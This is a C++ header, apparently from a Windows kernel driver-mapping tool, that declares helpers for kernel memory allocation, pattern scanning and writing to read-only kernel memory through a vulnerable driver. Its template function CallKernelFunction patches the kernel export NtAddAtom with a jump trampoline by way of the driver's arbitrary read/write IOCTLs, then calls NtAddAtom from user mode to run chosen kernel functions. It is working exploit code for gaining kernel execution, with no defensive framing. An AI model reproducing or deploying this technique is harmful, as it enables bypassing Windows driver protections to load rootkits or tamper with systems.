#pragma once
#pragma warning(disable : 4984)
#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <random>
#include <Psapi.h>
#include "vulndriver.h"
#include "additional_nt.h"
#define PAGE_SIZE 0x1000


typedef
_Struct_size_bytes_(_Inexpressible_(sizeof(struct _MDL) +    // 747934
	(ByteOffset + ByteCount + PAGE_SIZE - 1) / PAGE_SIZE * sizeof(PFN_NUMBER)))
	struct _MDL {
	struct _MDL* Next;
	short Size;
	short MdlFlags;

	struct _EPROCESS* Process;
	PVOID MappedSystemVa;   /* see creators for field size annotations. */
	PVOID StartVa;   /* see creators for validity; could be address 0.  */
	ULONG ByteCount;
	ULONG ByteOffset;
} MDL, * PMDL;


typedef struct _REPLACEMENT {
    char* Replace;
    char WhereTo;
    int RepCount;
} REPLACEMENT, * PREPLACEMENT;


namespace general {
    PVOID ManipulateAddress(PVOID Address, ULONG64 Size, BOOL IsAdd);
    int CharpToWcharp(const char* ConvertString, WCHAR* ConvertedString);
    int WcharpToCharp(char* ConvertString, const WCHAR* ConvertedString);
    std::wstring GetCurrentPathWide(std::wstring AddName);
    void GetCurrentPathRegular(char Path[], std::wstring AddName);
    int CountOccurrences(const char* SearchStr, char SearchLetter);
    void GetServiceName(char* Path, char* Buffer);
    void ReplaceValues(const char* BaseString, REPLACEMENT RepArr[], char* Output, int Size);
    DWORD ExecuteSystem(const char* BaseCommand, REPLACEMENT RepArr[], int Size);
    void GetRandomName(char* NameBuf, DWORD RandSize, const char* Extension);
    int GetPidByName(const char* Name);
    int CheckLetterInArr(char Chr, const char* Arr);
    BOOL PerformCommand(const char* CommandArr[], const char* Replacements[], const char* Symbols, int CommandCount, int SymbolCount);
}


namespace specific {
    DWORD MemoryToFile(LPCWSTR FileName, BYTE MemoryData[], SIZE_T MemorySize);
    PVOID FileToMemory(const char* FilePath, ULONG* PoolSize);
    PVOID GetKernelModuleAddress(const char* ModuleName);
    BOOL CompareBetweenData(const BYTE DataToCheck[], const BYTE CheckAgainst[], const char* SearchMask);
    PVOID FindPattern(PVOID StartingAddress, ULONG SearchLength, BYTE CheckAgainst[], const char* SearchMask);
    PVOID FindSectionOfKernelModule(const char* SectionName, PVOID HeadersPointer, ULONG* SectionSize);
    PVOID GetKernelModuleExport(HANDLE* DeviceHandle, PVOID ModuleBaseAddress, const char* ExportName);
    BOOL HandleResourceLite(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID FunctionResource, BOOL IsAcquire);
    PVOID HandleElementGenericTable(HANDLE* DeviceHandle, PVOID KernelBaseAddress, nt::PRTL_AVL_TABLE LookupTable, PVOID EntryBuffer, BOOL IsLookup);
    BOOL HandleExFreePool(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID PoolAddress);
    NTSTATUS HandleNtQuerySystemInformation(HANDLE* DeviceHandle, PVOID KernelBaseAddress, SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
    BOOL WriteToReadOnlyMemory(HANDLE* DeviceHandle, PVOID DestinationAddress, PVOID SourceAddress, SIZE_T WriteSize);
}


namespace allocations {
    PVOID MmAllocateIndependentPagesEx(HANDLE* DeviceHandle, PVOID KernelBaseAddress, SIZE_T AllocationSize);
    BOOL MmFreeIndependentPages(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID AllocationAddress, SIZE_T AllocationSize);
    BOOL MmSetPageProtection(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID AllocationAddress, SIZE_T AllocationSize, ULONG NewProtection);
    PVOID MmAllocatePagesForMdl(HANDLE* DeviceHandle, PVOID KernelBaseAddress, LARGE_INTEGER LowAddress, LARGE_INTEGER HighAddress, LARGE_INTEGER SkipBytes, SIZE_T TotalBytes);
    PVOID MmMapLockedPagesSpecifyCache(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PMDL DesciptorModule, nt::KPROCESSOR_MODE AccessMode, nt::MEMORY_CACHING_TYPE CacheType, PVOID RequestedAddress, ULONG BugCheckOnFailure, ULONG Priority);
    BOOL MmProtectMdlSystemAddress(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID MemoryDescriptorList, ULONG NewProtect);
    BOOL MmUnmapLockedPages(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID BaseAddress, PMDL DesciptorModule);
    BOOL MmFreePagesFromMdl(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID MemoryDescriptorList);
    PVOID ExAllocatePoolWithTag(HANDLE* DeviceHandle, PVOID KernelBaseAddress, nt::POOL_TYPE PoolType, ULONG64 AllocationSize);
    BOOL ExFreePool(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID KernelPoolAddress);
    PVOID AllocateIndependentPagesWrapper(HANDLE* DeviceHandle, PVOID KernelBaseAddress, SIZE_T AllocationSize);
    PVOID AllocateDescriptorModuleWrapper(HANDLE* DeviceHandle, PVOID KernelBaseAddress, SIZE_T AllocationSize, PMDL* DescriptorModule);
}


template<typename RetType, typename ...Args>
BOOL CallKernelFunction(HANDLE* DeviceHandle, RetType* FunctionResult, PVOID FunctionAddress,
    PVOID KernelBaseAddress, const Args ...FunctionArguments) {
    HMODULE NtDll = GetModuleHandleA("ntdll.dll");
    PVOID NtAddAtom = NULL;
    PVOID NtAddAtomExport = NULL;
    BYTE TrampolineHook[] = { 0x49, 0xbd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs r13, FunctionAddress
                          0x41, 0xff, 0xe5 };  // jmp r13 (FunctionAddress)
    BYTE OriginalFunctionData[sizeof(TrampolineHook)] = {0};
    RtlCopyMemory(&TrampolineHook[2], &FunctionAddress, sizeof(PVOID));


    // Check if return type is void:
    constexpr BOOL IsReturnVoid = std::is_same_v<RetType, void>;
    if constexpr (!IsReturnVoid) {
        if (FunctionResult == NULL) {
            return FALSE;
        }
    }
    else {
        UNREFERENCED_PARAMETER(FunctionResult);
    }


    // Get handle to ntdll.dll:
    if (NtDll == NULL) {
        return FALSE;
    }


    // Get address of NtAddAtom to abuse:
    NtAddAtom = (PVOID)GetProcAddress(NtDll, "NtAddAtom");
    if (NtAddAtom == NULL) {
        return FALSE;
    }


    // Get the kernel export of NtAddAtom itself:
    NtAddAtomExport = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "NtAddAtom");
    if (NtAddAtomExport == NULL) {
        return FALSE;
    }


    // Read the original data from the export into a saved buffer:
    if (OriginalFunctionData == NULL) {
        return FALSE;  // Cannot save original data
    }
    if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, NtAddAtomExport, &OriginalFunctionData, sizeof(TrampolineHook))) {
        return FALSE;  // Cannot save original data
    }


    // Check if the kernel export is already hooked:
    if (OriginalFunctionData[0] == TrampolineHook[0] && OriginalFunctionData[1] == TrampolineHook[1] &&
        OriginalFunctionData[sizeof(TrampolineHook) - 2] == TrampolineHook[sizeof(TrampolineHook) - 2] &&
        OriginalFunctionData[sizeof(TrampolineHook) - 1] == TrampolineHook[sizeof(TrampolineHook) - 1] &&
        OriginalFunctionData[sizeof(TrampolineHook) - 3] == TrampolineHook[sizeof(TrampolineHook) - 3]) {
        return FALSE;  // Function is already hooked, movabs and jmp are installed
    }


    // Hook the NtAddAtom export and run the trampoline hook when called:
    if (!specific::WriteToReadOnlyMemory(DeviceHandle, NtAddAtomExport, &TrampolineHook, sizeof(TrampolineHook))) {
        return FALSE;
    }


    // Call NtQueryAtom, trigger the hook and call this trampoline:
    if constexpr (!IsReturnVoid) {
        // Constant return type RetType, returns RetType
        using NtAddAtomType = RetType(__stdcall*)(Args...);
        const NtAddAtomType CallNtAddAtom = (NtAddAtomType)NtAddAtom;
        *FunctionResult = CallNtAddAtom(FunctionArguments...);
    }
    else {
        // Non-constant return type RetType, returns void
        using NtAddAtomType = void(__stdcall*)(Args...);
        const NtAddAtomType CallNtAddAtom = (NtAddAtomType)NtAddAtom;
        CallNtAddAtom(FunctionArguments...);
    }


    // Restore original data from NtAddAtom:
    return specific::WriteToReadOnlyMemory(DeviceHandle, NtAddAtomExport, OriginalFunctionData, sizeof(TrampolineHook));
}